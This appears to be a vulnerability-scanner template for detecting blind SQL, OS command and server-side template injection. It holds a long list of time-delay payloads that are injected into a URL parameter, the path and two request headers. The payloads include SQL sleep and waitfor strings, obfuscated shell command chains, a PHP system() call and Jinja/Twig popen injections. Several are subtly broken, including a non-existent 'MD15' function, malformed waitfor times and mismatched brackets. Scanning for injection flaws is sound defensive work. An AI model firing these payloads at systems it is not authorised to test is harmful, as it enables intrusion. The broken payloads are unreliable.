id: multiple-injections

info:
  name: Multiple Injection Vulnerability
  author: Zahir
  severity: high
  description: |
    Detects various types of injection vulnerabilities using payloads that introduce time delays to test for blind SQL injections, command injections, and other types of injections. 
    This template checks if the server's response time is greater than 15 seconds or if there are SQL errors in the response, indicating potential vulnerability.
  tags: injection, blind-sql, command-injection

variables:
  payloads: |
    sleep(15)#
    '} OR sleep(15)#
    " or sleep(15)#
    +AND+(SELECT+1533+FROM+(SELECT(SLEEP(15)))XyJh)--+
    ' AND (SELECT 1533 FROM (SELECT(SLEEP(15)))XyJh)--+-
    /*!13337'+AND+(SELECT+1533+FROM+(SELECT(SLEEP(15)))XyJh)*/
    OR sleep(15)--+
    ' or sleep(15)#
    ' or sleep(15)--+-
    ' OR sleep(15)--+
    '") or sleep(15)#
    '} or sleep(15)#
    " or sleep(15)="
    ' Or sleep(15)='
    ) or sleep(15)#
    ") or sleep(15)="
    ') or sleep(15)='
    )) or sleep(15)#
    ")) or sleep(15)="
    ')) oR sleep(15)='
    ' || SLEEP(15)--+-
    ;waitfor delay '0:0:15'--
    );waitfor delay '0:0:15'--
    ';waitfor delay '0:0:15'--
    ";waitfor delay '0:0:15'--
    ');waitfor delay '0:0:15'--
    ");waitfor delay '0:0:15'--
    ));waitfor delay '0:0:15'--
    '));waitfor delay '0:0:15'--
    "));waitfor delay '0:0:15'--
    benchmark(15000000,MD15(1))#
     or benchmark(15000000,MD15(1))#
    " or benchmark(15000000,MD15(1))#
    ' or benchmark(15000000,MD15(1))#
    ) or benchmark(15000000,MD15(1))#
    ") or benchmark(15000000,MD15(1))#
    ') or benchmark(15000000,MD15(1))#
    )) or benchmark(15000000,MD15(1))#
    ")) or benchmark(15000000,MD15(1))#
    ')) or benchmark(15000000,MD15(1))#
    pg_sleep(15)--
     or pg_sleep(15)--
    " or pg_sleep(15)-- 
    ' or pg_sleep(15)--
    ) or pg_sleep(15)--
    ") or pg_sleep(15)--
    ') or pg_sleep(15)--
    )) or pg_sleep(15)--
    ")) or pg_sleep(15)--
    ')) or pg_sleep(15)--
    +AND (SELECT * FROM (SELECT(SLEEP(15)))bAKL) AND 'vRxe'='vRxe
    +AND (SELECT * FROM (SELECT(SLEEP(15)))YjoC) AND '%'='
    +AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)
    +AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)--
    +AND (SELECT * FROM (SELECT(SLEEP(15)))nQIP)#
    +SLEEP(15)#
    +SLEEP(15)--%20
    +SLEEP(15)="
    +SLEEP(15)='
    +or SLEEP(15)
    +or SLEEP(15)#
    +or SLEEP(15)--
    +or SLEEP(15)="
    +or SLEEP(15)='
    +waitfor delay '00:00:015'
    +waitfor delay '00:00:015'--
    +waitfor delay '00:00:015'#
    +benchmark(150000000,MD15(1))
    +benchmark(150000000,MD15(1))--
    +benchmark(150000000,MD15(1))#
    +or benchmark(150000000,MD15(1))
    +or benchmark(150000000,MD15(1))--
    +or benchmark(150000000,MD15(1))#
    +pg_SLEEP(15)
    +pg_SLEEP(15)--
    +pg_SLEEP(15)#
    +or pg_SLEEP(15)
    +or pg_SLEEP(15)--
    +or pg_SLEEP(15)#
    +'\" OR SLeeP(15)--+-
    +AnD SLEEP(15)
    +AnD SLEEP(15)--
    +AnD SLEEP(15)#
    &&SLEEP(15)
    &&SLEEP(15)--
    &&SLEEP(15)#
    ' AnD SLEEP(15) ANd '1
    '&&SLEEP(15)&&'1
    +ORDER BY SLEEP(15)
    +ORDER BY SLEEP(15)--
    +ORDER BY SLEEP(15)#
     (SELECT * FROM (SELECT(SLEEP(15)))ecMj)
    +(SELECT * FROM (SELECT(SLEEP(15)))ecMj)#
     (SELECT * FROM (SELECT(SLEEP(15)))ecMj)--
     (SELECT * FROM (SELECT(SLEEP(15)))ecMj)--+-
    +benchmark(3200,SHA1(1))+'
    + SLEEP(15) + '
    +RANDOMBLOB(1500000000/2)
    +AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))))
    +OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))))
    +RANDOMBLOB(1500000000/2)
    +AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))))
    +OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))))
    +SLEEP(15)/*' or SLEEP(15) or '" or SLEEP(15) or "*/
    ; slee\p 15
    & sleep 15
    && sleep 15
    sleep 15
    || s\leep 15
    | sleep 15
    ; sleep 15
    {${sleep(15)}}
    & slee\p 15 
    && sl\ee\p 15
    sl\ee\p 15
    || sleep 15
    | sleep 15
    ; sleep 15
    & slee\p 15 
    && sleep 15
    {${sle\ep(20)}}
    {${sleep(20)}}
    {${sl\eep(15)}}
    {${sleep(15)}}
    | s\lee\p 8
    ; slee\p 8
    & SleeP 8
    && sleep 15
     /*!009+slEEp+*/ 15
    {${slee\p(hexde\c(dechex(20)))}} 
    {${sleep(hexdec(dechex(20)))}}
    //\\%20<?php system("sleep 15");?>
    <?php system("sleep 15");?>
    & ping -i 30 127.0.0.1 & 
    & ping -n 30 127.0.0.1 &
    ||ping -c 15 127.0.0.1 ||
    |pi\ng -c 15 127.0.0.1 |
    &&pin\g -c 15 127.0.0.1 &
    |eval('sleep 15')
    eval('sleep 15')
    |ev\al('sle\ep 15');
    &&eval('sleep 15')
    & eval('sleep 15'); &
    eval('sleep 15');
    ||$(sleep 15);
    `sleep 15`
    |`sleep 15`
    %0a ping\ -i 30 127.0.0.1 %0a
    ||%0a p\in\g -i 30 127.0.0.1 %0a
    %2 -n 21 127.0.0.1||`p\i\n\g -c 21 127.0.0.1` #' |p\in\g -n 21 127.0.0.1||`\p\i\n\g -c 21 127.0.0.1` #\" |p\i\ng -n 21 127.0.0.1
    }}{{config._class_._init_._globals_['os'].popen('sle\ep 15').read()}}
    %}{% import os %}{{os.popen('s\l\e\ep 15').read() }}
    %}{% import subprocess %}{{subprocess.Popen('s\lee\p 15',shell=True,stdout=-1).communicate()[0]]}
    %><%= 'sl\ee\p 15' %>

requests:
  - method: GET
    path:
      - "{{BaseURL}}?id={{payloads}}"
      - "{{BaseURL}}/{{payloads}}"
    headers:
      User-Agent: "{{payloads}}"
      Referer: "{{payloads}}"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "SQL error"
          - "mysql_fetch"
          - "Unclosed quotation mark"
          - "pg_query"
          - "ODBC SQL"
          - "invalid input syntax"
          - "ORA-"
          - "Warning: mysql"
          - "Warning: pg"
          - "Unknown column"
      - type: dsl
        dsl:
          - response.time > 15s  # Check if the response time exceeds 15 seconds

